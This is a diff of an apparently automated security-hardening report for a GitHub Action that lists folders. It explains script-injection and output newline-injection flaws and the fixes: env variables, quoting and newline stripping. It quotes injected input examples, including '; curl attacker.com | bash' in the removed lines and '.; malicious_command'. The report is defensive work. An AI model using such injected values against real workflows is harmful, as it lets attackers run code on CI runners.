@@ -8,19 +8,27 @@
 
 **Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`
 
-**Harden Agent Version:** `1`
+**Harden Agent Version:** `2`
 
-Action **philips-labs--list-folder-action/v3.0** was hardened automatically. 2 finding(s) were identified and resolved across 2 iteration(s).
+Action **philips-labs--list-folder-action/v3.0** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-Rule (a) violation: The `inputs.path` expression is directly interpolated into a `run:` shell command as `cd ${{ inputs.path }}`. Since GitHub Actions performs YAML template substitution before the shell ever sees the string, an attacker-controlled value (e.g. `; curl attacker.com | bash`) can be injected and executed as arbitrary shell code. The fix is to pass the input via an `env:` variable and reference it as a quoted shell variable: `env: { INPUT_PATH: "${{ inputs.path }}" }` then `cd "$INPUT_PATH"` in the script.
+Sub-rule (a) and (b): The `run:` block on line 19 directly interpolates the user-controlled input `${{ inputs.path }}` into a shell command: `cd ${{ inputs.path }}`. This allows an attacker to inject arbitrary shell commands by supplying a crafted `path` value (e.g., `.; malicious_command`). The value is also unquoted, compounding the risk. The expression must be moved to an `env:` variable and double-quoted: `env: INPUT_PATH: ${{ inputs.path }}` then `cd "$INPUT_PATH"`.
 
 Locations:
 
 - `action.yml:19`
+
+### github-env-injection (severity: high)
+
+The `run:` block writes `$folders` to `$GITHUB_OUTPUT` on line 22 (`echo "folders=$folders" >> $GITHUB_OUTPUT`) without sanitization. The `$folders` variable is derived from processing a directory path supplied via the untrusted `inputs.path` input. No `printf '%s' "$folders" | tr -d '\n\r'` sanitization step is applied before the write, allowing newline injection that could poison subsequent steps reading from `$GITHUB_OUTPUT`. Additionally, `$folders` is unquoted on line 21 (`echo $folders`), which is also unsafe.
+
+Locations:
+
+- `action.yml:22`
 
 ### static-inline-injection (severity: high)
 
@@ -34,19 +42,12 @@ Locations:
 
 ### Iteration 1
 
-**Fixes applied:** script-injection, static-inline-injection
+**Fixes applied:** script-injection, github-env-injection, static-inline-injection
 
 **Notes:**
 
-Fixed script injection vulnerability in action.yml at line 19. Moved `${{ inputs.path }}` from the `run:` block into an `env:` variable (`INPUT_PATH: ${{ inputs.path }}`), then updated the shell command from `cd ${{ inputs.path }}` to `cd "$INPUT_PATH"`. This prevents attacker-controlled input values from being interpolated directly into the shell command string.
-
-### Iteration 1
-
-**Fixes applied:** script-injection, github-env-injection
-
-**Notes:**
-
-Fixed both findings in action.yml's `set-folders` step:
-1. **script-injection**: Changed `echo $folders` to `echo "$folders"` to properly quote the variable and prevent word-splitting/glob expansion from attacker-controlled directory names.
-2. **github-env-injection**: Added a sanitization step `safe_folders=$(printf '%s' "$folders" | tr -d '\n\r')` to strip newlines/carriage-returns before writing to $GITHUB_OUTPUT. The sanitized value is now written as `echo "folders=$safe_folders" >> "$GITHUB_OUTPUT"` (also quoting $GITHUB_OUTPUT for good measure).
+Fixed action.yml step 'set-folders':
+1. Moved `${{ inputs.path }}` from the run block into an `env:` variable `INPUT_PATH` and double-quoted it in the shell (`cd "$INPUT_PATH"`), eliminating shell injection risk.
+2. Quoted `$folders` in the diagnostic `echo` call.
+3. Added `safe=$(printf '%s' "$folders" | tr -d '\n\r')` sanitization before writing to `$GITHUB_OUTPUT` to prevent newline injection, and quoted `$GITHUB_OUTPUT` in the redirection.
 
